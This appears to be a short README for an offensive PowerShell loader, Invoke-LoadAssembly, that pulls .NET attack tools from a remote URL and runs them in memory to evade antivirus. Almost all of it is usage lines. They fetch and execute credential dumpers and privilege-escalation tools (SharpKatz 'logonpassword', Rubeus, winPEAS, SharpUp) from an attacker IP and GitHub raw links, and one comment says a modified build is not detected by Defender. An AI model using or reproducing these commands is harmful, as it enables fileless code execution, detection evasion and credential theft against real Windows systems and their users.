# PowerShell exec-assembly remote loader

## This is used to load sharp assembly tools remotely from PowerShell direcly in memory (fileless) for a better AV bypass (need AMSI bypass first)

Usage:

```
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpKatz.exe -Command "msv"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "msv"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/SharpKatz.exe?raw=true -Command "logonpassword"

Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/winPEAS.exe -Command "notcolor quiet log"
Invoke-LoadAssembly -AssemblyUrl https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/Dotfuscated/any/winPEASany.exe?raw=true -Command "notcolor quiet"

Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/Rubeus.exe -Command "hash /password:test"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/Rubeus.exe?raw=true -Command "hash /password:test"
Invoke-LoadAssembly -AssemblyUrl https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_x64/Rubeus.exe?raw=true -Command "hash /password:test"

# After fix the reflectedType is not public issue (Defender not detected):
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpUpNew.exe -Command "audit"
Invoke-LoadAssembly -AssemblyUrl https://github.com/F4l13n5n0w/PowerSharpLoader/blob/master/x64/SharpUp.exe?raw=true -Command "audit"

```